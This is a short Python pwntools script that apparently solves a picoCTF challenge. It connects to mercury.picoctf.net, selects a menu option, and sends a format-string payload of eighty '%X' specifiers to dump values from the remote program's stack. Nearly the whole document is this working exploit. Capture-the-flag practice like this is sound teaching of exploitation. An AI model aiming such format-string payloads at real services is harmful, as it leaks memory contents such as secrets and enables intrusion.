from pwn import *

host = 'mercury.picoctf.net'
port = 6989

# Connect to remote service
proc = remote(host, port)

proc.recvuntil(b'portfolio\n')
proc.sendline(b'1')
proc.recvuntil(b'token?\n')

# Payload: dumping 80 values from the stack using %X (uppercase hex)
payload = (b"%X" * 80)
proc.sendline(payload)
result = proc.recvall()

# Decode to string
decoded = result.decode()
success(f'Dumped stack values:\n{decoded}')

proc.close()
